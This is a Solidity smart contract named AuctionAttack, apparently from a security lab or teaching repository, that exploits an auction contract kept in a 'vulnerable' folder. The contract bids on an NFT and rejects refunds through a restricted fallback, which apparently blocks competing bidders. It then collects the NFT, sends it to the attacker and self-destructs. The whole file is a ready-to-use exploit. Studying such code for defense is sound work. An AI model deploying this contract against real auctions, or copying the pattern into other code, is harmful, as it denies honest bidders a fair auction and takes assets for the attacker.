// SPDX-License-Identifier: unlicensed
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "../vulnerable/Auction.sol";

contract AuctionAttack {
    address payable _owner;
    Auction _auctionContract;

    constructor(address _existingAuctionContractAddress) payable {
        _owner = payable(msg.sender);
        _auctionContract = Auction(_existingAuctionContractAddress);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) public pure returns (bytes4) {
        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Only the owner may call");
        _;
    }

    fallback() external onlyOwner {
        // reject any refunds because the sender is not the attacker
    }

    function bid(uint256 _id) public onlyOwner {
        _auctionContract.bid{value: 1.000001 ether}(_id);
    }

    function collect(uint256 _id) public onlyOwner {
        // this contract collects the NFT
        _auctionContract.collect(_id);
        // transfer the NFT to the attacker
        ERC721 nftContract = ERC721(_auctionContract.nftContract());
        nftContract.safeTransferFrom(address(this), _owner, _id);
        // disable this contract and return the remaining ETH to the attacker
        selfdestruct(_owner);
    }
}
